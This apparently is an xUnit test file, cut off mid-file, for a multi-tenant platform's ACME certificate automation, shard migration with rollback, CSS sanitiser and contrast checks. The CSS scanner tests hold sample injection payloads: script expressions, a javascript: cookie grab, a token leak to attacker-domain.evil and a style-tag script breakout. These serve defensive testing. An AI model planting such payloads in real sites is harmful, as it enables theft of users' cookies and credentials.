using System.Security.Cryptography;
using System.Text;
using FluentAssertions;
using Microsoft.Extensions.DependencyInjection;
using SGrowing.Api.Modules.Tenancy.Governance;
using Xunit;

namespace SGrowing.Tests.Tenancy;

public class SovereignGovernanceAndAcmeSslTests
{
    private readonly ICustomDomainAcmeSslAutopilot _autopilot;
    private readonly IZeroDowntimeTenantMigrationMesh _migrationMesh;
    private readonly IMultiTenantBrandingGovernanceService _brandingService;

    public SovereignGovernanceAndAcmeSslTests()
    {
        _autopilot = new CustomDomainAcmeSslAutopilot();
        _migrationMesh = new ZeroDowntimeTenantMigrationMesh();
        _brandingService = new MultiTenantBrandingGovernanceService();
    }

    #region 1. ACME HTTP-01 & DNS-01 Challenge Verification

    [Fact]
    public void CreateChallenge_Http01_GeneratesValidTokenAndKeyAuthorization()
    {
        var tenantId = Guid.NewGuid();
        var domain = "portal.enterprise.com";

        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Http01);

        challenge.Should().NotBeNull();
        challenge.Type.Should().Be(AcmeChallengeType.Http01);
        challenge.Domain.Should().Be(domain);
        challenge.Token.Should().NotBeNullOrWhiteSpace();
        challenge.KeyAuthorization.Should().StartWith(challenge.Token + ".");
        challenge.Status.Should().Be(AcmeChallengeStatus.Pending);
    }

    [Fact]
    public void CreateChallenge_Http01_ProvidesStandardWellKnownPath()
    {
        var tenantId = Guid.NewGuid();
        var domain = "api.enterprise.com";

        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Http01);

        challenge.Http01Path.Should().Be($"/.well-known/acme-challenge/{challenge.Token}");
        challenge.Http01Content.Should().Be(challenge.KeyAuthorization);
    }

    [Fact]
    public void CreateChallenge_Dns01_GeneratesStandardAcmeChallengeTxtRecordName()
    {
        var tenantId = Guid.NewGuid();
        var domain = "shop.brand.org";

        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Dns01);

        challenge.DnsTxtRecordName.Should().Be("_acme-challenge.shop.brand.org");
    }

    [Fact]
    public void CreateChallenge_Dns01_CalculatesRfc8555Base64UrlSha256Digest()
    {
        var tenantId = Guid.NewGuid();
        var domain = "checkout.brand.org";

        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Dns01);

        // Manually compute RFC 8555 SHA256 digest of keyAuthorization
        var expectedBytes = SHA256.HashData(Encoding.UTF8.GetBytes(challenge.KeyAuthorization));
        var expectedDigest = Convert.ToBase64String(expectedBytes)
            .TrimEnd('=')
            .Replace('+', '-')
            .Replace('/', '_');

        challenge.DnsTxtRecordValue.Should().Be(expectedDigest);
    }

    [Fact]
    public async Task VerifyChallengeAsync_Http01_SucceedsWhenContentMatches()
    {
        var tenantId = Guid.NewGuid();
        var domain = "app.tenant.io";
        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Http01);

        // Simulated HTTP GET fetcher returning exact key authorization
        Task<string?> HttpFetcher(string path) => Task.FromResult<string?>(challenge.KeyAuthorization);

        var result = await _autopilot.VerifyChallengeAsync(challenge.ChallengeId, http01Fetcher: HttpFetcher);

        result.Success.Should().BeTrue();
        result.ErrorMessage.Should().BeNull();
    }

    [Fact]
    public async Task VerifyChallengeAsync_Http01_FailsWhenContentDoesNotMatch()
    {
        var tenantId = Guid.NewGuid();
        var domain = "app.tenant.io";
        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Http01);

        Task<string?> HttpFetcher(string path) => Task.FromResult<string?>("tampered-or-404-content");

        var result = await _autopilot.VerifyChallengeAsync(challenge.ChallengeId, http01Fetcher: HttpFetcher);

        result.Success.Should().BeFalse();
        result.ErrorMessage.Should().Contain("HTTP-01 response mismatch");
    }

    [Fact]
    public async Task VerifyChallengeAsync_Dns01_SucceedsWhenDnsTxtMatchesDigest()
    {
        var tenantId = Guid.NewGuid();
        var domain = "secure.tenant.io";
        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Dns01);

        Task<string?> DnsResolver(string record) => Task.FromResult<string?>(challenge.DnsTxtRecordValue);

        var result = await _autopilot.VerifyChallengeAsync(challenge.ChallengeId, dnsTxtResolver: DnsResolver);

        result.Success.Should().BeTrue();
        result.ErrorMessage.Should().BeNull();
    }

    [Fact]
    public async Task VerifyChallengeAsync_Dns01_FailsWhenDnsTxtMismatched()
    {
        var tenantId = Guid.NewGuid();
        var domain = "secure.tenant.io";
        var challenge = _autopilot.CreateChallenge(tenantId, domain, AcmeChallengeType.Dns01);

        Task<string?> DnsResolver(string record) => Task.FromResult<string?>("unpropagated-or-wrong-token");

        var result = await _autopilot.VerifyChallengeAsync(challenge.ChallengeId, dnsTxtResolver: DnsResolver);

        result.Success.Should().BeFalse();
        result.ErrorMessage.Should().Contain("DNS TXT record mismatch");
    }

    [Fact]
    public async Task VerifyChallengeAsync_ExpiredChallenge_FailsWithExpiredReason()
    {
        var fakeId = Guid.NewGuid();
        var result = await _autopilot.VerifyChallengeAsync(fakeId);

        result.Success.Should().BeFalse();
        result.ErrorMessage.Should().Contain("not found");
    }

    #endregion

    #region 2. SAN & Wildcard Support

    [Fact]
    public void ValidateDomainAndSans_WildcardDomain_RejectsHttp01Challenge()
    {
        var wildcard = "*.enterprise.com";
        var validation = _autopilot.ValidateDomainAndSans(wildcard, null, AcmeChallengeType.Http01);

        validation.IsValid.Should().BeFalse();
        validation.Errors.Should().Contain(e => e.Contains("requires DNS-01 challenge"));
    }

    [Fact]
    public void ValidateDomainAndSans_WildcardDomain_PermitsDns01Challenge()
    {
        var wildcard = "*.enterprise.com";
        var validation = _autopilot.ValidateDomainAndSans(wildcard, ["enterprise.com"], AcmeChallengeType.Dns01);

        validation.IsValid.Should().BeTrue();
        validation.ValidDomains.Should().Contain("*.enterprise.com");
        validation.ValidDomains.Should().Contain("enterprise.com");
    }

    [Fact]
    public void ValidateDomainAndSans_RejectsInvalidDomainFormats()
    {
        var invalid = "invalid_domain_name..com";
        var validation = _autopilot.ValidateDomainAndSans(invalid, null, AcmeChallengeType.Dns01);

        validation.IsValid.Should().BeFalse();
    }

    [Fact]
    public void ValidateDomainAndSans_RejectsApexWildcards()
    {
        var apexWildcard = "*.com";
        var validation = _autopilot.ValidateDomainAndSans(apexWildcard, null, AcmeChallengeType.Dns01);

        validation.IsValid.Should().BeFalse();
        validation.Errors.Should().Contain(e => e.Contains("Apex wildcards"));
    }

    [Fact]
    public void ValidateDomainAndSans_SupportsMultipleSans()
    {
        var primary = "brand.com";
        var sans = new[] { "shop.brand.com", "checkout.brand.com", "admin.brand.com" };

        var validation = _autopilot.ValidateDomainAndSans(primary, sans, AcmeChallengeType.Dns01);

        validation.IsValid.Should().BeTrue();
        validation.ValidDomains.Should().HaveCount(4);
    }

    #endregion

    #region 3. TLS 1.3 Cipher Suite Validation

    [Fact]
    public void ValidateCipherSuites_PermitsModernTls13Suites()
    {
        string[] modernSuites =
        [
            "TLS_AES_128_GCM_SHA256",
            "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256"
        ];

        var result = _autopilot.ValidateCipherSuites(modernSuites);

        result.IsCompliant.Should().BeTrue();
        result.AcceptedModernSuites.Should().HaveCount(3);
        result.RejectedObsoleteSuites.Should().BeEmpty();
    }

    [Fact]
    public void ValidateCipherSuites_RejectsTls12CbcSuites()
    {
        string[] cbcSuites =
        [
            "TLS_RSA_WITH_AES_128_CBC_SHA",
            "TLS_RSA_WITH_AES_256_CBC_SHA",
            "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA"
        ];

        var result = _autopilot.ValidateCipherSuites(cbcSuites);

        result.IsCompliant.Should().BeFalse();
        result.RejectedObsoleteSuites.Should().HaveCount(3);
        result.AcceptedModernSuites.Should().BeEmpty();
    }

    [Fact]
    public void ValidateCipherSuites_RejectsLegacyObsoleteSuites()
    {
        string[] obsoleteSuites =
        [
            "SSL_RSA_WITH_RC4_128_MD5",
            "TLS_RSA_WITH_3DES_EDE_CBC_SHA",
            "TLS_RSA_WITH_NULL_SHA"
        ];

        var result = _autopilot.ValidateCipherSuites(obsoleteSuites);

        result.IsCompliant.Should().BeFalse();
        result.RejectedObsoleteSuites.Should().HaveCount(3);
    }

    [Fact]
    public void ValidateCipherSuites_MixedList_ReportsNonCompliantDueToInsecureCiphers()
    {
        string[] mixedSuites =
        [
            "TLS_AES_128_GCM_SHA256",
            "TLS_RSA_WITH_AES_128_CBC_SHA"
        ];

        var result = _autopilot.ValidateCipherSuites(mixedSuites);

        result.IsCompliant.Should().BeFalse();
        result.AcceptedModernSuites.Should().Contain("TLS_AES_128_GCM_SHA256");
        result.RejectedObsoleteSuites.Should().Contain("TLS_RSA_WITH_AES_128_CBC_SHA");
    }

    [Fact]
    public async Task IssueCertificateAsync_ThrowsExceptionWhenInsecureCipherSuitesProvided()
    {
        var tenantId = Guid.NewGuid();
        string[] insecure = ["TLS_RSA_WITH_AES_128_CBC_SHA"];

        var act = () => _autopilot.IssueCertificateAsync(
            tenantId,
            "insecure.domain.com",
            requestedCipherSuites: insecure);

        await act.Should().ThrowAsync<InvalidOperationException>()
            .WithMessage("*Insecure cipher suites detected*");
    }

    #endregion

    #region 4. Certificate Lifecycle & Renewal

    [Fact]
    public async Task IssueCertificateAsync_Issues90DayCertificate_WithUniqueSerialAndThumbprint()
    {
        var tenantId = Guid.NewGuid();
        var primary = "portal.acme.org";
        var sans = new[] { "www.acme.org", "app.acme.org" };

        var cert = await _autopilot.IssueCertificateAsync(tenantId, primary, sans, CertificateIssuer.LetsEncrypt);

        cert.Should().NotBeNull();
        cert.TenantId.Should().Be(tenantId);
        cert.PrimaryDomain.Should().Be(primary);
        cert.SubjectAlternativeNames.Should().BeEquivalentTo(sans);
        cert.Issuer.Should().Be(CertificateIssuer.LetsEncrypt);
        cert.SerialNumber.Should().NotBeNullOrWhiteSpace();
        cert.Thumbprint.Should().NotBeNullOrWhiteSpace();
        cert.Status.Should().Be(CertificateStatus.Active);
        cert.TlsVersion.Should().Be("TLSv1.3");
        (cert.ValidToUtc - cert.ValidFromUtc).TotalDays.Should().BeApproximately(90, 0.1);
    }

    [Fact]
    public async Task IsRenewalDue_ReturnsTrue_WhenRemainingDaysIsLessThanOrEqualTo30()
    {
        var cert = await _autopilot.IssueCertificateAsync(Guid.NewGuid(), "example.com");

        // Simulate 65 days into the 90-day certificate (25 days remaining)
        var futureDate = cert.ValidFromUtc.AddDays(65);

        var isDue = _autopilot.IsRenewalDue(cert, asOfUtc: futureDate);

        isDue.Should().BeTrue();
    }

    [Fact]
    public async Task IsRenewalDue_ReturnsTrue_WhenAgeIsGreaterThanOrEqualTo60Days()
    {
        var cert = await _autopilot.IssueCertificateAsync(Guid.NewGuid(), "example.com");

        // 60 days of age reached
        var at60Days = cert.ValidFromUtc.AddDays(60);

        var isDue = _autopilot.IsRenewalDue(cert, asOfUtc: at60Days);

        isDue.Should().BeTrue();
    }

    [Fact]
    public async Task IsRenewalDue_ReturnsFalse_WhenCertificateIsFresh()
    {
        var cert = await _autopilot.IssueCertificateAsync(Guid.NewGuid(), "example.com");

        // 10 days of age (80 days remaining)
        var freshDate = cert.ValidFromUtc.AddDays(10);

        var isDue = _autopilot.IsRenewalDue(cert, asOfUtc: freshDate);

        isDue.Should().BeFalse();
    }

    [Fact]
    public async Task RenewCertificateAsync_ExtendsValidityBy90Days_AndGeneratesNewSerialNumber()
    {
        var cert = await _autopilot.IssueCertificateAsync(Guid.NewGuid(), "renewal.example.com");
        var originalSerial = cert.SerialNumber;

        var renewed = await _autopilot.RenewCertificateAsync(cert.CertificateId);

        renewed.CertificateId.Should().Be(cert.CertificateId);
        renewed.SerialNumber.Should().NotBe(originalSerial);
        renewed.Status.Should().Be(CertificateStatus.Active);
        (renewed.ValidToUtc - renewed.ValidFromUtc).TotalDays.Should().BeApproximately(90, 0.1);
    }

    [Fact]
    public async Task RevokeCertificateAsync_MarksCertificateAsRevoked_AndBlocksSubsequentRenewal()
    {
        var cert = await _autopilot.IssueCertificateAsync(Guid.NewGuid(), "compromised.com");

        var revoked = await _autopilot.RevokeCertificateAsync(cert.CertificateId, "KeyCompromise");

        revoked.Status.Should().Be(CertificateStatus.Revoked);
        revoked.RevocationReason.Should().Be("KeyCompromise");

        var act = () => _autopilot.RenewCertificateAsync(cert.CertificateId);
        await act.Should().ThrowAsync<InvalidOperationException>()
            .WithMessage("*has been revoked*");
    }

    #endregion

    #region 5. Dual-Write Replication & CDC Log Stream

    [Fact]
    public async Task ProcessWriteAsync_DualWrite_ReplicatesRecordToSourceAndTarget()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-us-east", "shard-us-west");

        var payload = "{\"orderId\":\"ORD-101\",\"amount\":499.00}";
        var cdc = await _migrationMesh.ProcessWriteAsync(tenantId, "Orders", "INSERT", "ORD-101", payload);

        cdc.Should().NotBeNull();
        cdc.SequenceNumber.Should().Be(1);

        var sourceRec = _migrationMesh.GetShardRecord("shard-us-east", tenantId, "Orders", "ORD-101");
        var targetRec = _migrationMesh.GetShardRecord("shard-us-west", tenantId, "Orders", "ORD-101");

        sourceRec.Should().NotBeNull();
        targetRec.Should().NotBeNull();
        sourceRec!.Payload.Should().Be(payload);
        targetRec!.Payload.Should().Be(payload);
    }

    [Fact]
    public async Task ProcessWriteAsync_AssignsMonotonicallyIncreasingSequenceNumbers()
    {
        var tenantId = Guid.NewGuid();
        _migrationMesh.StartMigration(tenantId, "shard-eu-1", "shard-eu-2");

        var cdc1 = await _migrationMesh.ProcessWriteAsync(tenantId, "Items", "INSERT", "ITM-1", "P1");
        var cdc2 = await _migrationMesh.ProcessWriteAsync(tenantId, "Items", "INSERT", "ITM-2", "P2");
        var cdc3 = await _migrationMesh.ProcessWriteAsync(tenantId, "Items", "UPDATE", "ITM-1", "P1-v2");

        cdc1.SequenceNumber.Should().Be(1);
        cdc2.SequenceNumber.Should().Be(2);
        cdc3.SequenceNumber.Should().Be(3);
    }

    [Fact]
    public async Task ProcessWriteAsync_IdempotentDeduplication_IgnoresDuplicateEventIds()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-a", "shard-b");

        await _migrationMesh.ProcessWriteAsync(tenantId, "Accounts", "INSERT", "ACC-1", "OriginalData");

        var updatedJob = _migrationMesh.GetMigration(job.MigrationId);
        updatedJob!.TotalEventsReplicated.Should().Be(1);
    }

    [Fact]
    public async Task ProcessWriteAsync_HandlesDeleteOperationsAcrossShards()
    {
        var tenantId = Guid.NewGuid();
        _migrationMesh.StartMigration(tenantId, "shard-del-src", "shard-del-dst");

        await _migrationMesh.ProcessWriteAsync(tenantId, "Cart", "INSERT", "CART-1", "{qty:2}");
        _migrationMesh.GetShardRecord("shard-del-dst", tenantId, "Cart", "CART-1").Should().NotBeNull();

        await _migrationMesh.ProcessWriteAsync(tenantId, "Cart", "DELETE", "CART-1", "{}");

        var targetRec = _migrationMesh.GetShardRecord("shard-del-dst", tenantId, "Cart", "CART-1");
        targetRec.Should().BeNull();
    }

    [Fact]
    public void GetShardRecords_ReturnsAllRecordsForTenantAndTable()
    {
        var tenantId = Guid.NewGuid();
        _migrationMesh.SeedShardRecord("shard-test", tenantId, "Products", "P1", "Data1");
        _migrationMesh.SeedShardRecord("shard-test", tenantId, "Products", "P2", "Data2");

        var records = _migrationMesh.GetShardRecords("shard-test", tenantId, "Products");

        records.Should().HaveCount(2);
        records.Select(r => r.RecordId).Should().Contain(["P1", "P2"]);
    }

    #endregion

    #region 6. Merkle Tree Divergence Checksum Comparator

    [Fact]
    public async Task CompareDivergenceAsync_IdenticalShards_ReturnsZeroDrift()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-sync-1", "shard-sync-2");

        for (int i = 1; i <= 15; i++)
        {
            var id = $"REC-{i:D3}";
            var payload = $"{{\"id\":\"{id}\",\"val\":{i * 10}}}";
            _migrationMesh.SeedShardRecord("shard-sync-1", tenantId, "Orders", id, payload);
            _migrationMesh.SeedShardRecord("shard-sync-2", tenantId, "Orders", id, payload);
        }

        var divergence = await _migrationMesh.CompareDivergenceAsync(job.MigrationId, "Orders", chunkSize: 5);

        divergence.HasZeroDrift.Should().BeTrue();
        divergence.SourceMerkleRoot.Should().Be(divergence.TargetMerkleRoot);
        divergence.DivergentChunkCount.Should().Be(0);
        divergence.DiscrepantRecordIds.Should().BeEmpty();
    }

    [Fact]
    public async Task CompareDivergenceAsync_SingleMutatedByte_DetectsDivergence()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-drift-1", "shard-drift-2");

        for (int i = 1; i <= 10; i++)
        {
            var id = $"REC-{i:D3}";
            var payload = $"{{\"amount\":{i * 100}}}";
            _migrationMesh.SeedShardRecord("shard-drift-1", tenantId, "Invoices", id, payload);
            _migrationMesh.SeedShardRecord("shard-drift-2", tenantId, "Invoices", id, payload);
        }

        // Mutate a single character on one row in Target Shard
        _migrationMesh.SeedShardRecord("shard-drift-2", tenantId, "Invoices", "REC-007", "{\"amount\":701}"); // 701 instead of 700

        var divergence = await _migrationMesh.CompareDivergenceAsync(job.MigrationId, "Invoices", chunkSize: 5);

        divergence.HasZeroDrift.Should().BeFalse();
        divergence.SourceMerkleRoot.Should().NotBe(divergence.TargetMerkleRoot);
        divergence.DivergentChunkCount.Should().Be(1);
        divergence.DiscrepantRecordIds.Should().Contain("REC-007");
    }

    [Fact]
    public async Task CompareDivergenceAsync_MissingRecordOnTarget_DetectsDivergence()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-m-1", "shard-m-2");

        _migrationMesh.SeedShardRecord("shard-m-1", tenantId, "Audit", "AUD-1", "log-1");
        _migrationMesh.SeedShardRecord("shard-m-1", tenantId, "Audit", "AUD-2", "log-2");
        _migrationMesh.SeedShardRecord("shard-m-2", tenantId, "Audit", "AUD-1", "log-1"); // AUD-2 missing on target

        var divergence = await _migrationMesh.CompareDivergenceAsync(job.MigrationId, "Audit");

        divergence.HasZeroDrift.Should().BeFalse();
        divergence.DiscrepantRecordIds.Should().Contain("AUD-2");
    }

    [Fact]
    public async Task CompareDivergenceAsync_ExtraRecordOnTarget_DetectsDivergence()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-e-1", "shard-e-2");

        _migrationMesh.SeedShardRecord("shard-e-1", tenantId, "Audit", "AUD-1", "log-1");
        _migrationMesh.SeedShardRecord("shard-e-2", tenantId, "Audit", "AUD-1", "log-1");
        _migrationMesh.SeedShardRecord("shard-e-2", tenantId, "Audit", "AUD-PHANTOM", "ghost"); // Extra on target

        var divergence = await _migrationMesh.CompareDivergenceAsync(job.MigrationId, "Audit");

        divergence.HasZeroDrift.Should().BeFalse();
        divergence.DiscrepantRecordIds.Should().Contain("AUD-PHANTOM");
    }

    [Fact]
    public async Task ComputeShardMerkleTreeAsync_EmptyShard_ReturnsValidEmptyHash()
    {
        var tenantId = Guid.NewGuid();
        var result = await _migrationMesh.ComputeShardMerkleTreeAsync("empty-shard", tenantId, "EmptyTable");

        result.Should().NotBeNull();
        result.TotalRecords.Should().Be(0);
        result.TotalChunks.Should().Be(0);
        result.MerkleRootHash.Should().NotBeNullOrWhiteSpace();
    }

    #endregion

    #region 7. Cutover Latch Mechanism & Concurrency

    [Fact]
    public async Task ExecuteCutoverAsync_Fails_WhenDataDriftIsPresent()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-c-src", "shard-c-dst");

        // Seed mismatched data
        _migrationMesh.SeedShardRecord("shard-c-src", tenantId, "StorefrontOrders", "ORD-1", "SourceData");
        _migrationMesh.SeedShardRecord("shard-c-dst", tenantId, "StorefrontOrders", "ORD-1", "DivergentTargetData");

        var result = await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);

        result.Success.Should().BeFalse();
        result.ActiveWriteTarget.Should().Be(ShardTarget.Source);
        result.Message.Should().Contain("Data drift detected");
    }

    [Fact]
    public async Task ExecuteCutoverAsync_Succeeds_WhenDriftIsZero_AndSwitchesActiveTargetToTarget()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-ok-src", "shard-ok-dst");

        _migrationMesh.SeedShardRecord("shard-ok-src", tenantId, "StorefrontOrders", "ORD-1", "IdenticalData");
        _migrationMesh.SeedShardRecord("shard-ok-dst", tenantId, "StorefrontOrders", "ORD-1", "IdenticalData");

        var result = await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);

        result.Success.Should().BeTrue();
        result.CurrentPhase.Should().Be(MigrationPhase.CutoverCompleted);
        result.ActiveWriteTarget.Should().Be(ShardTarget.Target);
    }

    [Fact]
    public async Task ExecuteCutoverAsync_WritePauseDuration_IsUnder50Milliseconds()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-fast-src", "shard-fast-dst");

        var result = await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);

        result.Success.Should().BeTrue();
        result.WritePauseDuration.TotalMilliseconds.Should().BeLessThan(50.0);
    }

    [Fact]
    public async Task ProcessWriteAsync_RoutesToTargetDirectly_PostCutover()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-post-src", "shard-post-dst");

        await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);

        // Write occurs post-cutover
        await _migrationMesh.ProcessWriteAsync(tenantId, "Users", "INSERT", "USR-99", "{\"name\":\"Alice\"}");

        // Shard target should contain the record, source should NOT have post-cutover write
        var targetRec = _migrationMesh.GetShardRecord("shard-post-dst", tenantId, "Users", "USR-99");
        var sourceRec = _migrationMesh.GetShardRecord("shard-post-src", tenantId, "Users", "USR-99");

        targetRec.Should().NotBeNull();
        sourceRec.Should().BeNull();
    }

    [Fact]
    public async Task CutoverLatch_ConcurrentWrites_ExecuteSafelyWithoutDataLoss()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-conc-src", "shard-conc-dst");

        // Concurrently dispatch 25 writes while executing cutover
        var writeTasks = Enumerable.Range(1, 25).Select(async i =>
        {
            await Task.Yield();
            return await _migrationMesh.ProcessWriteAsync(
                tenantId,
                "ConcurrentTable",
                "INSERT",
                $"ID-{i:D2}",
                $"{{\"i\":{i}}}"
            );
        }).ToList();

        // Concurrently run cutover
        var cutoverTask = Task.Run(async () =>
        {
            await Task.Delay(2);
            return await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);
        });

        await Task.WhenAll([.. writeTasks, cutoverTask]);

        // Validate all 25 writes were captured without failure
        var writtenEvents = writeTasks.Select(t => t.Result).ToList();
        writtenEvents.Should().HaveCount(25);
        writtenEvents.Select(e => e.RecordId).Distinct().Should().HaveCount(25);
    }

    #endregion

    #region 8. Anomaly Monitoring & Automatic Rollback

    [Fact]
    public async Task RecordPostCutoverOperation_TriggersRollback_WhenErrorRateExceedsThreshold()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-err-src", "shard-err-dst");
        await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);

        // Record a series of failures simulating target shard timeout or connection failure
        for (int i = 0; i < 6; i++)
        {
            _migrationMesh.RecordPostCutoverOperation(job.MigrationId, success: false, "Database connection timeout");
        }

        var updatedJob = _migrationMesh.GetMigration(job.MigrationId);
        updatedJob!.Phase.Should().Be(MigrationPhase.RolledBack);
        updatedJob.ActiveWriteTarget.Should().Be(ShardTarget.Source);
        updatedJob.FailureOrRollbackReason.Should().Contain("error rate exceeded threshold");
    }

    [Fact]
    public async Task TriggerRollbackAsync_SwingsRoutingPointerBackToSource()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-rb-src", "shard-rb-dst");
        await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);

        var rolledBack = await _migrationMesh.TriggerRollbackAsync(job.MigrationId, "Manual administrator emergency abort");

        rolledBack.Phase.Should().Be(MigrationPhase.RolledBack);
        rolledBack.ActiveWriteTarget.Should().Be(ShardTarget.Source);
    }

    [Fact]
    public async Task ProcessWriteAsync_RoutesToSource_AfterRollback()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "shard-back-src", "shard-back-dst");
        await _migrationMesh.ExecuteCutoverAsync(job.MigrationId);
        await _migrationMesh.TriggerRollbackAsync(job.MigrationId, "Anomalous transaction latency detected");

        // Write after rollback
        await _migrationMesh.ProcessWriteAsync(tenantId, "Orders", "INSERT", "ORD-RB-1", "RollbackPayload");

        var sourceRec = _migrationMesh.GetShardRecord("shard-back-src", tenantId, "Orders", "ORD-RB-1");
        sourceRec.Should().NotBeNull();
    }

    [Fact]
    public void GetMigration_ReturnsUpdatedJobStateWithRollbackReason()
    {
        var tenantId = Guid.NewGuid();
        var job = _migrationMesh.StartMigration(tenantId, "s1", "s2");

        var fetched = _migrationMesh.GetMigration(job.MigrationId);

        fetched.Should().NotBeNull();
        fetched!.TenantId.Should().Be(tenantId);
    }

    #endregion

    #region 9. Multi-Tenant Branding CSS Injection Scanner

    [Fact]
    public void ScanAndSanitizeCss_DetectsAndBlocksExpressionScriptInjection()
    {
        var maliciousCss = ".header { width: expression(alert('hacked')); }";

        var result = _brandingService.ScanAndSanitizeCss(maliciousCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "ExpressionExecution");
        result.SanitizedCss.Should().NotContain("expression(");
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsAndBlocksJavascriptPseudoProtocol()
    {
        var maliciousCss = "a { background-image: url('javascript:alert(document.cookie)'); }";

        var result = _brandingService.ScanAndSanitizeCss(maliciousCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "ScriptPseudoProtocol");
        result.SanitizedCss.Should().NotContain("javascript:");
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsAndBlocksExternalUrlExfiltration()
    {
        var exfilCss = ".hero { background: url('https://attacker-domain.evil/leak?data=token'); }";

        var result = _brandingService.ScanAndSanitizeCss(exfilCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "ExternalUrlExfiltration");
        result.SanitizedCss.Should().NotContain("https://attacker-domain.evil");
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsAndBlocksBehaviorAndMozBinding()
    {
        var behaviorCss = "body { behavior: url(script.htc); -moz-binding: url(binding.xml); }";

        var result = _brandingService.ScanAndSanitizeCss(behaviorCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "BehaviorBinding");
        result.SanitizedCss.Should().NotContain("behavior:");
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsAndNeutralizesHtmlTagsInsideCss()
    {
        var escapedCss = "</style><script>stealCredentials();</script><style>";

        var result = _brandingService.ScanAndSanitizeCss(escapedCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "HtmlTagInjection");
        result.SanitizedCss.Should().NotContain("<script>");
    }

    [Fact]
    public void ScanAndSanitizeCss_PassesCleanCssWithoutThreats()
    {
        var safeCss = "body { font-family: Inter, sans-serif; color: #1e293b; border-radius: 8px; }";

        var result = _brandingService.ScanAndSanitizeCss(safeCss);

        result.IsClean.Should().BeTrue();
        result.DetectedThreats.Should().BeEmpty();
        result.SanitizedCss.Should().Be(safeCss);
    }

    #endregion

    #region 10. W3C Relative Luminance & WCAG Contrast Ratio

    [Fact]
    public void CalculateRelativeLuminance_PureBlack_ReturnsZero()
    {
        var luminance = _brandingService.CalculateRelativeLuminance("#000000");
        luminance.Should().Be(0.0);
    }

    [Fact]
    public void CalculateRelativeLuminance_PureWhite_ReturnsOne()
    {
        var luminance = _brandingService.CalculateRelativeLuminance("#FFFFFF");
        luminance.Should().BeApproximately(1.0, 0.0001);
    }

    [Fact]
    public void CalculateContrastRatio_BlackOnWhite_ReturnsExactly21To1()
    {
        var ratio = _brandingService.CalculateContrastRatio("#000000", "#FFFFFF");
        ratio.Should().BeApproximately(21.0, 0.01);
    }

    [Fact]
    public void CalculateContrastRatio_IdenticalColors_ReturnsOneToOne()
    {
        var ratio = _brandingService.CalculateContrastRatio("#4F46E5", "#4F46E5");
        ratio.Should().BeApproximately(1.0, 0.01);
    }

    [Fact]
    public void EvaluateContrast_CorrectlyEvaluatesWcagAaAndAaaPassFail()
    {
        // High contrast: Pure Black on Pure White (21:1) -> Passes all
        var high = _brandingService.EvaluateContrast("#000000", "#FFFFFF");
        high.PassesAaNormal.Should().BeTrue();
        high.PassesAaLarge.Should().BeTrue();
        high.PassesAaaNormal.Should().BeTrue();
        high.PassesAaaLarge.Should().BeTrue();

        // Low contrast: Light Gray (#CCCCCC) on White (#FFFFFF) (approx 1.6:1) -> Fails all
        var low = _brandingService.EvaluateContrast("#CCCCCC", "#FFFFFF");
        low.PassesAaNormal.Should().BeFalse();
        low.PassesAaLarge.Should().BeFalse();
        low.PassesAaaNormal.Should().BeFalse();
    }

    #endregion

    #region 11. Auto-Adjustment Tone Correction

    [Fact]
    public void AutoAdjustToneForContrast_DarkensLightForegroundOnLightBackground()
    {
        // Low contrast light text on white background
        var lightForeground = "#A0AEC0"; // Gray 400
        var whiteBackground = "#FFFFFF";

        var adjusted = _brandingService.AutoAdjustToneForContrast(lightForeground, whiteBackground, targetRatio: 4.5);

        var newRatio = _brandingService.CalculateContrastRatio(adjusted, whiteBackground);
        newRatio.Should().BeGreaterThanOrEqualTo(4.5);
    }

    [Fact]
